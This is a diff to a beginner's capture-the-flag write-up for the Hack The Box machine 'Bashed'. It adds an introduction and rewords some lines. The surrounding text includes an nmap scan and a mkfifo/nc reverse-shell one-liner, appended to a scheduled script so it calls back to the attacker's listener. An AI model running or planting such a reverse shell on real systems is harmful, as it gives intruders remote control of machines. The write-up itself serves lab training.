@@ -8,11 +8,13 @@
 
 ## Introduction
 
---
+Bashed is a beginner's box which was the first CTF I ever attempted. When I tried it, I had booted up Kali and knew that a couple tools existed, but did not have any strategies, context or experience. 
+
+This write up assumes that the reader is using Kali, but any pentesting distro such as [BlackArch](https://blackarch.org/) will work. The tools come with a stock Kali installation, unless otherwise mentioned.
 
 ## 1. Initial Scanning
 
-As usual we only have the IP so we start an nmap scan.
+As usual on HTB we only have the IP in the network so we start an nmap scan.
 
 `nmap 10.10.10.68`
 
@@ -80,7 +82,7 @@ After that I did set up a nc listener on post 2491 and added following command i
 
 `echo "rm/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.XXX 2491 >/tmp/f" >> monitor.sh`
 
-Thank you for that command @sicurolab.´
+Thank you for that command @sicurolab, since I was stuck here.
 
 ![2ctf](https://i.imgur.com/ANHg0Jv.png)
 
